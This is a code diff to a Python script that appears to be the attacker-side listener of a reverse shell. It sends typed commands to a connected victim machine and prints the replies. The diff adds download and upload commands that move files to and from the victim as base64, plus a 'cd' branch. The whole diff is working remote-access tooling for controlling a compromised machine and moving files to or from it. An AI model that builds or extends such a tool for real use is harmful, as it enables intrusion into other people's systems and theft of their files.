@@ -1,4 +1,5 @@
 #!/usr/bin/python
+import base64
 import socket
 import json
 
@@ -6,10 +7,17 @@ import json
 def shell():
     while True:
         cmd = input("* Shell#~%s: " % str(ip))
-        reliable_send(cmd)
-        print(reliable_recv())
         if cmd == "exit":
             break
+        elif cmd[:2] == "cd" and len(cmd) > 1:
+            continue
+        elif cmd[:8] == "download":
+            download(cmd)
+        elif cmd[:6] == "upload":
+            upload(cmd)
+        else:
+            reliable_send(cmd)
+            print(reliable_recv())
 
 
 def server():
@@ -37,6 +45,25 @@ def reliable_recv():
             return json.loads(json_data.decode())
         except ValueError:
             continue
+
+
+def download(cmd):
+    try:
+        with open(cmd[9:], "wb") as file:
+            result = reliable_recv()
+            file.write(base64.b64decode(result))
+            return True
+    except:
+        return False
+
+
+def upload(cmd):
+    try:
+        with open(cmd[7:], "rb") as file:
+            reliable_send(base64.b64encode(file.read()))
+            return True
+    except:
+        return False
 
 
 if __name__ == '__main__':
